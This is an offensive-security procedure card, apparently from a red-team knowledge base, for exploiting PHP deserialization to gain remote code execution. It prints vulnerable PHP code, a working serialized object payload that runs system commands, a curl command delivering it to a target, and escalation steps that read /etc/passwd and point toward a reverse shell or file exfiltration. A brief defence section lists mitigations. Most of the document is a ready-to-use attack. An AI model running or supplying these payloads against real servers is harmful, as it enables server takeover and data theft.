---
id: 9cfa19b9-5bf4-43ef-a849-5472d46f8ce8
name: PHP-Deserialization-Code-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:59.310055+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques: []
tags:
  - '[[tags/General concept]]'
  - '[[tags/PHP Deserialization]]'
  - rce
  - web-exploit
commands:
  - '[[commands/curl-send-php-deserialization-payload]]'
platforms:
  - Web
  - PHP
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# PHP-Deserialization-Code-Execution

## Summary

This procedure exploits PHP deserialization vulnerabilities by crafting and injecting serialized objects into user-controlled input fields, such as URL parameters or forms, to trigger arbitrary code execution on the server via unsafe unserialize calls and eval statements. It targets applications using custom classes like PHPObjectInjection that process untrusted serialized data, leading to remote code execution (RCE) and potential full server compromise.

## Description

PHP deserialization vulnerabilities occur when applications unserialize user-supplied data without proper validation, allowing attackers to instantiate malicious objects that execute code during methods like __wakeup(). In this scenario, the target application uses a PHPObjectInjection class vulnerable through the 'inject' property, which is evaluated via eval() upon unserialization. The 'r' parameter accepts serialized input, enabling attackers to forge objects for command execution. This technique is common in legacy PHP apps or misconfigured serialization handlers. Exploitation requires identifying the vulnerable endpoint (e.g., via fuzzing or source review) and crafting payloads that bypass any filters. Successful exploitation grants shell access, enabling data theft, persistence, or lateral movement. Business impacts include data breaches, server takeover, and compliance violations.

The vulnerable code example is:

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

This code unserializes the 'r' parameter and triggers __wakeup(), executing any code in $inject.

## Requirements

1. Network access to the vulnerable web application endpoint accepting serialized input (e.g., via HTTP GET/POST).
2. Knowledge of the target PHP class structure (e.g., via source code leak, error messages, or common patterns like PHPObjectInjection).
3. Tools for payload crafting and request interception, such as [[tools/Burp-Suite]] or Python with php-serialize libraries.
4. A listening service on the attacker machine if exfiltrating output (e.g., netcat for command results).

## Defense

Defensive measures and detection strategies:

- Avoid unserializing untrusted input; use JSON or safe formats like base64 for data exchange.
- Implement object blacklisting or whitelisting in unserialize() calls, or disable __wakeup() in sensitive classes.
- Enable PHP security extensions like Suhosin to restrict eval() and dangerous functions.
- Monitor for anomalous HTTP requests with long base64-like payloads in parameters; use WAF rules to block suspicious serialization patterns.
- Log and alert on eval() executions or unexpected process spawns from web contexts (e.g., via auditd or PHP error logs).

## Objectives

1. Exploit the PHP deserialization vulnerability to execute arbitrary code on the server.
2. Gain access to sensitive data on the server via command output.
3. Compromise the server and establish a foothold for further attacks, such as reverse shell deployment.

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Confirm the application accepts and unserializes user input in the 'r' parameter or similar. Use error-based testing or review source if available to verify the presence of unsafe unserialize().

Intercept requests with [[tools/Burp-Suite]] to inspect parameters. Test with benign serialized data to observe behavior.

**Expected Output**: Application echoes or processes the input without errors, indicating unserialization occurs.

### Step 2: Craft Malicious Payload

**Context**: Create a serialized PHPObjectInjection instance with code in the 'inject' property. Use the payload to execute a reconnaissance command like 'whoami' to verify RCE without disruption.

Reference the serialized payload: [[codes/PHP-Object-Injection-Serialized-Payload]]

Basic serialized array for comparison: `a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}`

Malicious payload: `O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}`

URL-encode the payload for transmission.

**Expected Output**: Valid serialized string ready for injection.

### Step 3: Inject Payload and Execute

**Context**: Send the crafted payload via HTTP request to trigger deserialization and code execution. Use a command like [[commands/curl-send-php-deserialization-payload]] to simulate the attack.

**Command** ([[commands/curl-send-php-deserialization-payload]]):
```bash
curl -X GET "http://target.com/vulnerable.php?r=O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A17%3A%22system(%27whoami%27)%3B%22%3B%7D" -v
```

> This sends the URL-encoded payload to the 'r' parameter. The -v flag shows verbose output, including response headers and body. Modify the command for POST if needed (e.g., -X POST -d "r=payload").

**Expected Output**: Server response includes the output of the executed command (e.g., username like 'www-data') mixed with any echo from the array check, confirming RCE.

### Step 4: Escalate and Verify

**Context**: If successful, chain to more impactful commands, such as downloading a reverse shell or exfiltrating files. Test with system('id'); or system('cat /etc/passwd'); to validate access level.

Update the payload's inject property accordingly and resend using the same command.

**Expected Output**: Command output in the HTTP response, such as user ID or file contents.

**Success Indicators**:
- Response contains executed command output (e.g., 'www-data' from whoami).
- No PHP errors indicating failed unserialization.
- Ability to execute escalating commands without blocks.
